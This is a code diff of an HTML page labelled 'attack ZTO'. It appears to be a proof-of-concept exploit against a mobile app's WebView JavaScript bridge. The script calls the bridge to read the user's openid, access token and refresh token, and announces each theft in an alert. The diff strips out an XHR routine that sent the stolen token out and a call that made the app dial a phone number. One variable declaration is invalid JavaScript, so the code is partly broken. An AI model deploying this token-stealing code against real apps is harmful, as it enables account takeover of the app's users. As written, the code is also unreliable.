@@ -9,44 +9,6 @@
 <p id="content">attack ZTO </p>
 <script>
     
-        function createXHR() {
-        if (typeof XMLHttpRequest != 'undefined') {
-            return new XMLHttpRequest();
-        } else if (typeof ActiveXObject != 'undefined') {
-            if (typeof arguments.callee.activeXString != 'string') {
-                var versions = ['MSXML2.XMLHttp.6.0', 'MSXML2.XMLHttp.3.0', 'MSXML2.XMLHttp'];
-                for (var i = 0; i < versions.length; i++) {
-                    try {
-                        var xhr = new ActiveXObject(versions[i]);
-                        arguments.callee.activeXString = versions[i];
-                        return xhr;
-                    } catch (ex) {
-                    }
-                }
-            }
-            return new ActiveXObject(arguments.callee.activeXString);
-        } else {
-            throw new Error('No XHR Object available');
-        }
-    }
-
-    // send GET Request
-    function sendGetRequest(url, callback) {
-        var xhr = createXHR();
-        xhr.open('GET', url, false);
-        xhr.send();
-        callback(xhr.responseText);
-    }
-
-    function sendRequest(url) {
-        sendGetRequest(url, function (response) {
-            //document.getElementById("content").innerText = 'cctest : ' + response;
-        });
-    }
-    
-    
-    
-
  function starZTO() {
    alert(window.client.getVersion());
      
@@ -56,22 +18,18 @@
    var window.client.openId=getOpenId();
   alert('窃取到您的openid:'+ openId);  
      
-   window.client.callPhone("17715293830");
+ 
      
    var stealToken = window.client.getToken();
    alert('窃取到您的token:'+ stealToken);
      
    var stealReToken = window.client.refreshToken();
    alert('窃取到您的refresh token:'+ stealReToken);  
-     
-   userInfo='getUserInfo : ' +stealToken;
-   document.getElementById("content").innerText = userInfo;
-   url =encodeURIComponent(userInfo);
-   sendRequest(url);
+
      
  } 
     
-    starZTO();
+starZTO();
     
 </script>
 </body>
